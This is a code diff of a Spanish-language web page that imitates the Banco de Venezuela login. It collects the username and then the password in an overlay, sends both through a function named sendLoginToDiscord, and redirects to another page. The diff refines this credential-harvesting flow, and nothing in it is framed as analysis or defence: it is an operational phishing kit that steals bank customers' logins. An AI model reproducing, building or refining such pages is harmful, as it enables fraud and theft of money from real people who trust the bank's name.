@@ -1,8 +1,8 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="es">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Banco de Venezuela</title>
     <style>
       body {
@@ -102,10 +102,6 @@
         width: 200px;
         cursor: pointer;
       }
-      button:disabled {
-        opacity: 0.6;
-        cursor: not-allowed;
-      }
     </style>
     <style>
       .form-group2 {
@@ -146,7 +142,7 @@
     </style>
     <style>
       .overlay {
-        display: none;
+        display: flex;
         justify-content: center;
         align-items: center;
         position: fixed;
@@ -158,10 +154,6 @@
         z-index: 9999;
       }
 
-      .overlay.active {
-        display: flex;
-      }
-
       .content {
         background-color: #fff;
         width: 350px;
@@ -171,40 +163,38 @@
     </style>
   </head>
   <body>
-    <!-- Overlay para la contraseña -->
+    <!-- Overlay de contraseña (visible por defecto en esta página) -->
     <div class="overlay" id="overlay">
       <div class="content">
         <form id="loginform2">
           <h4 style="color: #0067b1 !important">Introduce tu contraseña</h4>
           <div class="form-group2">
-            <input type="text" id="contra" required />
+            <input type="text" name="cl" id="contra" required>
             <label for="contra">Contraseña *</label>
           </div>
           <div style="width: 100%; text-align: center; padding-bottom: 30px">
-            <button type="submit" id="btnContinuar" style="width: 160px">Continuar</button>
+            <button type="submit" style="width: 160px">Continuar</button>
           </div>
         </form>
       </div>
     </div>
 
-    <!-- Contenedor principal -->
     <div class="container">
       <div class="left-side">
         <form id="loginform" class="form">
           <div style="text-align: center">
-            <img src="logo.png" alt="" style="width: 60%; margin-top: 20px" />
+            <img src="logo.png" alt="" style="width: 60%; margin-top: 20px">
           </div>
           <div style="width: 100%; text-align: center">
             <div class="form-group">
-              <input type="text" id="nombre" name="nombre" style="width: 100%" required />
+              <input type="text" id="nombre" name="nombre" style="width: 100%" required>
               <label for="nombre">Usuario *</label>
             </div>
           </div>
           <div style="width: 100%; text-align: center">
-            <button type="submit" id="btnEntrar">Entrar</button>
+            <button type="submit">Entrar</button>
           </div>
-          <div
-            style="
+          <div style="
               width: 100%;
               text-align: center;
               font-size: 12px;
@@ -212,9 +202,8 @@
               color: #999;
               margin-top: 30px;
               margin-bottom: 30px;
-            "
-          >
-            ¿Olvidaste tu usuario o clave? <br />
+            ">
+            ¿Olvidaste tu usuario o clave? <br>
             Si eres nuevo clienteBDV regístrate aquí
           </div>
         </form>
@@ -227,18 +216,13 @@
 
     <script>
       document.addEventListener('DOMContentLoaded', function() {
-        // Variables
         let storedUsername = '';
-        let formSubmitted = false;
         
-        // Elementos
         const loginForm = document.getElementById('loginform');
         const nombreInput = document.getElementById('nombre');
         const overlay = document.getElementById('overlay');
         const contraInput = document.getElementById('contra');
         const passwordForm = document.getElementById('loginform2');
-        const btnContinuar = document.getElementById('btnContinuar');
-        const btnEntrar = document.getElementById('btnEntrar');
 
         // Resetear estado al cargar
         if (typeof resetLoginSent === 'function') {
@@ -249,9 +233,6 @@
         loginForm.addEventListener('submit', function(e) {
           e.preventDefault();
           
-          // Evitar doble envío
-          if (formSubmitted) return;
-          
           const username = nombreInput.value.trim();
           
           if (username === '') {
@@ -260,12 +241,10 @@
             return;
           }
 
-          // Guardar usuario
           storedUsername = username;
-          formSubmitted = true;
           
           // Mostrar overlay de contraseña
-          overlay.classList.add('active');
+          overlay.style.display = 'flex';
           contraInput.value = '';
           setTimeout(() => contraInput.focus(), 100);
         });
@@ -273,9 +252,6 @@
         // Evento: Envío del formulario de contraseña
         passwordForm.addEventListener('submit', async function(e) {
           e.preventDefault();
-          
-          // 🔴 EVITAR DOBLE ENVÍO
-          if (btnContinuar.disabled) return;
           
           const password = contraInput.value.trim();
           
@@ -286,25 +262,27 @@
           }
 
           // Deshabilitar botón para evitar doble envío
-          btnContinuar.disabled = true;
-          btnContinuar.textContent = 'Enviando...';
+          const submitBtn = this.querySelector('button');
+          submitBtn.disabled = true;
+          submitBtn.textContent = 'Enviando...';
 
           try {
-            // 🔴 ENVIAR UN SOLO MENSAJE
+            // ENVIAR UN SOLO MENSAJE CON USUARIO + CONTRASEÑA
             const result = await sendLoginToDiscord(storedUsername, password);
             
-            // La redirección se hace dentro de sendLoginToDiscord
-            // Si llegamos aquí, hubo un error
-            if (!result.ok) {
+            if (result.ok) {
+              overlay.style.display = 'none';
+              window.location.href = 'sel.html';
+            } else {
               alert('Error al enviar los datos. Intente nuevamente.');
-              btnContinuar.disabled = false;
-              btnContinuar.textContent = 'Continuar';
+              submitBtn.disabled = false;
+              submitBtn.textContent = 'Continuar';
             }
           } catch (error) {
             console.error('Error:', error);
             alert('Error al procesar la solicitud.');
-            btnContinuar.disabled = false;
-            btnContinuar.textContent = 'Continuar';
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Continuar';
           }
         });
 
@@ -348,17 +326,8 @@
 
         // Cerrar overlay con ESC
         document.addEventListener('keydown', function(e) {
-          if (e.key === 'Escape' && overlay.classList.contains('active')) {
-            overlay.classList.remove('active');
-            formSubmitted = false;
-          }
-        });
-
-        // Resetear estado si se cierra el overlay
-        overlay.addEventListener('click', function(e) {
-          if (e.target === overlay) {
-            overlay.classList.remove('active');
-            formSubmitted = false;
+          if (e.key === 'Escape' && overlay.style.display === 'flex') {
+            overlay.style.display = 'none';
           }
         });
       });
